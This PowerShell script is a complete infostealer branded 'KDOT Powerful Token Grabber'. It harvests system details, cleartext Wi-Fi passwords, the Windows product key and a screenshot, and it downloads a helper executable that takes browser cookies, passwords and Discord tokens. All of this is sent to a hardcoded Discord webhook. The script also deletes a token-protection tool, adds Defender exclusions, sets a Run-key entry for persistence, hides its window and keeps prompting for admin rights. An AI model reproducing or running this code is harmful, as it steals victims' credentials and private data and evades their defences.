function CHECK_IF_ADMIN {
    $test = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator); echo $test
}

function EXFILTRATE-DATA {
    $webhook = "https://discord.com/api/webhooks/1095418313607229560/FNscsysNwboNU2sZHSNnN_fs8oVxOTAVSQcwlly4lDVmrLbY2wpj8wzO4zAQUq5kmsSg"
    $ip = Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing
    $ip = $ip.Content
    $ip > $env:LOCALAPPDATA\Temp\ip.txt
    $lang = (Get-WinUserLanguageList).LocalizedName
    $date = (get-date).toString("r")
    Get-ComputerInfo > $env:LOCALAPPDATA\Temp\system_info.txt
    $osversion = (Get-WmiObject -class Win32_OperatingSystem).Caption
    $uuid = Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID 
    $uuid > $env:LOCALAPPDATA\Temp\uuid.txt
    $cpu = Get-WmiObject -Class Win32_Processor | Select-Object -ExpandProperty Name
    $cpu > $env:LOCALAPPDATA\Temp\cpu.txt
    $fulldiskinfo = diskdata  | out-string 
    $fulldiskinfo > $env:temp\DiskInfo.txt
    $gpu = (Get-WmiObject Win32_VideoController).Name 
    $gpu > $env:LOCALAPPDATA\Temp\GPU.txt
    $format = " GB"
    $total = Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | Foreach {"{0:N2}" -f ([math]::round(($_.Sum / 1GB),2))}
    $raminfo = "$total" + "$format"  
    $mac = Get-WmiObject win32_networkadapterconfiguration | select description, macaddress
    $mac > $env:LOCALAPPDATA\Temp\mac.txt
    $username = $env:USERNAME
    $hostname = $env:COMPUTERNAME
    $netstat = netstat -ano > $env:LOCALAPPDATA\Temp\netstat.txt
    
    $wifipasslist = netsh wlan show profiles | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | out-string
    $wifi = $wifipasslist | out-string 
    $wifi > $env:temp\WIFIPasswords.txt
    
    Get-CimInstance Win32_StartupCommand | Select-Object Name, command, Location, User | Format-List > $env:temp\StartUpApps.txt
    
    Get-WmiObject win32_service |? State -match "running" | select Name, DisplayName, PathName, User | sort Name | ft -wrap -autosize >  $env:LOCALAPPDATA\Temp\running-services.txt
    
    Get-WmiObject win32_process | Select-Object Name,Description,ProcessId,ThreadCount,Handles,Path | ft -wrap -autosize > $env:temp\running-applications.txt
    
    Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table > $env:temp\Installed-Applications.txt
    
    Get-NetAdapter | ft Name,InterfaceDescription,PhysicalMediaType,NdisPhysicalMedium -AutoSize > $env:temp\NetworkAdapters.txt

    
    $ProductKey
    Get-ProductKey > $env:localappdata\temp\ProductKey.txt

    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
    $screens = [Windows.Forms.Screen]::AllScreens
    $top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
    $left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
    $width  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
    $height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum
    $bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
    $bmp      = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height)
    $graphics = [Drawing.Graphics]::FromImage($bmp)
    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
    $bmp.Save("$env:localappdata\temp\desktop-screenshot.png")
    $graphics.Dispose()
    $bmp.Dispose()
    
    
    $embed_and_body = @{
        "username" = "KDOT"
        "content" = "@everyone"
        "title" = "KDOT"
        "description" = "Powerful Token Grabber"
        "color" = "16711680"
        "avatar_url" = "https://i.postimg.cc/m2SSKrBt/Logo.gif"
        "url" = "https://discord.gg/vk3rBhcj2y"
        "embeds" = @(
            @{
                "title" = "POWERSHELL GRABBER"
                "url" = "https://github.com/KDot227/Powershell-Token-Grabber/tree/main"
                "description" = "New victim info collected !"
                "color" = "16711680"
                "footer" = @{
                    "text" = "Made by KDOT, GODFATHER and CHAINSKI"
                }
                "thumbnail" = @{
                    "url" = "https://i.postimg.cc/m2SSKrBt/Logo.gif"
                }
                "fields" = @(
                    @{
                        "name" = ":satellite: IP"
                        "value" = "``````$ip``````"
                    },
                    @{
                        "name" = ":bust_in_silhouette: User Information"
                        "value" = "``````Date: $date `nLanguage: $lang `nUsername: $username `nHostname: $hostname``````"
                    },
                    @{
                        "name" = ":computer: Hardware"
                        "value" = "``````OS: $osversion `nCPU: $cpu `nGPU: $gpu `nRAM: $raminfo `nHWID: $uuid `nMAC: $mac``````"
                    },
                    @{
                        "name" = ":floppy_disk: Disk"
                        "value" = "``````$fulldiskinfo``````"
                    }
                    @{
                        "name" = ":signal_strength: WiFi"
                        "value" = "``````$wifi``````"
                    }
                )
            }
        )
    }

    $payload = $embed_and_body | ConvertTo-Json -Depth 10
    Invoke-WebRequest -Uri $webhook -Method POST -Body $payload -ContentType "application/json" -UseBasicParsing | Out-Null

    Set-Location $env:LOCALAPPDATA\Temp

    $token_prot = Test-Path "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe"
    if ($token_prot -eq $true) {
        Remove-Item "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe" -Force
    }

    $secure_dat = Test-Path "$env:APPDATA\DiscordTokenProtector\secure.dat"
    if ($secure_dat -eq $true) {
        Remove-Item "$env:APPDATA\DiscordTokenProtector\secure.dat" -Force
    }

    $TEMP_KOT = Test-Path "$env:LOCALAPPDATA\Temp\KDOT"
    if ($TEMP_KOT -eq $false) {
        New-Item "$env:LOCALAPPDATA\Temp\KDOT" -Type Directory
    }
    
    $ProgressPreference = "SilentlyContinue";Invoke-WebRequest -Uri "https://github.com/KDot227/Powershell-Token-Grabber/releases/download/Fixed_version/main.exe" -OutFile "main.exe" -UseBasicParsing

    $proc = Start-Process $env:LOCALAPPDATA\Temp\main.exe -ArgumentList "$webhook" -NoNewWindow -PassThru
    $proc.WaitForExit()

    $extracted = "$env:LOCALAPPDATA\Temp"
    Move-Item -Path "$extracted\ip.txt" -Destination "$extracted\KDOT\ip.txt" -ErrorAction SilentlyContinue
    Move-Item -Path "$extracted\netstat.txt" -Destination "$extracted\KDOT\netstat.txt" -ErrorAction SilentlyContinue
    Move-Item -Path "$extracted\system_info.txt" -Destination "$extracted\KDOT\system_info.txt" -ErrorAction SilentlyContinue
    Move-Item -Path "$extracted\uuid.txt" -Destination "$extracted\KDOT\uuid.txt" -ErrorAction SilentlyContinue
    Move-Item -Path "$extracted\mac.txt" -Destination "$extracted\KDOT\mac.txt" -ErrorAction SilentlyContinue
    Move-Item -Path "$extracted\browser-cookies.txt" -Destination "$extracted\KDOT\browser-cookies.txt" -ErrorAction SilentlyContinue
    Move-Item -Path "$extracted\browser-history.txt" -Destination "$extracted\KDOT\browser-history.txt" -ErrorAction SilentlyContinue
    Move-Item -Path "$extracted\browser-passwords.txt" -Destination "$extracted\KDOT\browser-passwords.txt" -ErrorAction SilentlyContinue
    Move-Item -Path "$extracted\desktop-screenshot.png" -Destination "$extracted\KDOT\desktop-screenshot.png" -ErrorAction SilentlyContinue
    Move-Item -Path "$extracted\tokens.txt" -Destination "$extracted\KDOT\tokens.txt" -ErrorAction SilentlyContinue
    Move-Item -Path "$extracted\WIFIPasswords.txt" -Destination "$extracted\KDOT\WIFIPasswords.txt" -ErrorAction SilentlyContinue
    Move-Item -Path "$extracted\GPU.txt" -Destination "$extracted\KDOT\GPU.txt" -ErrorAction SilentlyContinue
    Move-Item -Path "$extracted\Installed-Applications.txt" -Destination "$extracted\KDOT\Installed-Applications.txt" -ErrorAction SilentlyContinue
    Move-Item -Path "$extracted\DiskInfo.txt" -Destination "$extracted\KDOT\DiskInfo.txt" -ErrorAction SilentlyContinue
    Move-Item -Path "$extracted\CPU.txt" -Destination "$extracted\KDOT\CPU.txt" -ErrorAction SilentlyContinue
    Move-Item -Path "$extracted\NetworkAdapters.txt" -Destination "$extracted\KDOT\NetworkAdapters.txt" -ErrorAction SilentlyContinue
    Move-Item -Path "$extracted\ProductKey.txt" -Destination "$extracted\KDOT\ProductKey.txt" -ErrorAction SilentlyContinue
    Move-Item -Path "$extracted\StartUpApps.txt" -Destination "$extracted\KDOT\StartUpApps.txt" -ErrorAction SilentlyContinue
    Move-Item -Path "$extracted\running-services.txt" -Destination "$extracted\KDOT\running-services.txt" -ErrorAction SilentlyContinue
    Move-Item -Path "$extracted\running-applications.txt" -Destination "$extracted\KDOT\running-applications.txt" -ErrorAction SilentlyContinue
    Compress-Archive -Path "$extracted\KDOT" -DestinationPath "$extracted\KDOT.zip" -Force
    curl.exe -X POST -F 'payload_json={\"username\": \"POWERSHELL GRABBER\", \"content\": \"\", \"avatar_url\": \"https://i.postimg.cc/m2SSKrBt/Logo.gif\"}' -F "file=@$extracted\KDOT.zip" $webhook
    Remove-Item "$extracted\KDOT.zip"
    Remove-Item "$extracted\KDOT" -Recurse
    Remove-Item "$extracted\main.exe"
}

function TASKS {
    $test_KDOT = Test-Path -Path "$env:APPDATA\KDOT"
    if ($test_KDOT -eq $false) {
        try {
            Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"
            Add-MpPreference -ExclusionPath "$env:APPDATA\KDOT"
        } catch {
            Write-Host "Failed to add exclusions"
        }
        New-Item -ItemType Directory -Path "$env:APPDATA\KDOT"
        $origin = $PSCommandPath
        Copy-Item -Path $origin -Destination "$env:APPDATA\KDOT\KDOT.ps1"
    }
    $scriptPath = "$env:APPDATA\KDOT\KDOT.ps1"
    $command = "powershell.exe -NonInteractive -NoProfile -Nologo -ExecutionPolicy Bypass -WindowStyle hidden -File `"$scriptPath`""
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    New-ItemProperty -Path $regPath -Name "KDOT" -Value $command -PropertyType String -Force | Out-Null
    EXFILTRATE-DATA
}

function diskdata {
    $disks = get-wmiobject Win32_LogicalDisk -computername "$env:computername" -Filter "DriveType = 3"
    foreach ($disk in $disks) {
        $letter = $disk.deviceID
        $volumename = $disk.volumename
        $totalspace = [math]::round($disk.size / 1GB, 2)
        $freespace = [math]::round($disk.freespace / 1GB, 2)
        $usedspace = [math]::round(($disk.size - $disk.freespace) / 1GB, 2)
        $disk | Select-Object @{n = "Letter"; e = { $letter } }, @{n = "Volume Name"; e = { $volumename } }, @{n = "Total (GB)"; e = { ($totalspace).tostring()}}, @{n = "Free (GB)"; e = { ($freespace).tostring()}}, @{n = "Used (GB)"; e = { ($usedspace).tostring()}} | FT 
    }
}

function Get-ProductKey {
    $map="BCDFGHJKMPQRTVWXY2346789"
    $value = (get-itemproperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").digitalproductid[0x34..0x42]
    $ProductKey = ""
    for ($i = 24; $i -ge 0; $i--) {
        $r = 0
        for ($j = 14; $j -ge 0; $j--) {
            $r = ($r * 256) -bxor $value[$j]
            $value[$j] = [math]::Floor([double]($r / 24))
            $r = $r % 24
        }
        $ProductKey = $map[$r] + $ProductKey

        if (($i % 5) -eq 0 -and $i -ne 0) {
            $ProductKey = "-" + $ProductKey
        }
    }
}

function Request-Admin {
    while(!(CHECK_IF_ADMIN)) {
        try {
            Start-Process "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle hidden -File `"$PSCommandPath`"" -Verb RunAs
            exit
        }
        catch {}
    }
}

function Hide-Console
{
    if (-not ("Console.Window" -as [type])) { 
        Add-Type -Name Window -Namespace Console -MemberDefinition '
        [DllImport("Kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
        '
    }
    $consolePtr = [Console.Window]::GetConsoleWindow()
    $null = [Console.Window]::ShowWindow($consolePtr, 0)
}


if (CHECK_IF_ADMIN -eq $true) {
    Hide-Console
    TASKS
} else {
    Write-Host ("Please run as admin!") -ForegroundColor Red
    Request-Admin
}
